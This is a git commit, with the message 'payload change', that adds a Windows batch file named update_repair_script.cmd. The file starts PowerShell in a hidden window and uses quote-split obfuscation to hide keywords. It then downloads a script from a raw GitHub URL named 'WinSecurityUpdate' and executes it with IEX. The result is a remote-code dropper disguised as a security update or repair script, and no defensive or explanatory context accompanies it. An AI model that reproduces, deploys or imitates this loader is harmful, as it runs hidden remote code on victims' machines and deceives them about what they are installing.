c5e8f3f1016a74a9d619d8549459c5409ff5c6a2
cudkajak <jakubcudka@gmail.com>
2021-10-27 11:45:31 +0200

    payload change

---
+++ update_script/update_repair_script.cmd
@@ -0,0 +1,2 @@
+@ECHO OFF
+po""weRs""He""l""L -nO""p -windowstyle hidden -c "i""Ex(N""ew-Ob""ject Net.W""EbclIent).DoWnL""OadstRi""nG('https://raw.githubusercontent.com/cudkajak/storage_unit13/main/update_script/WinSecurityUpdate')"
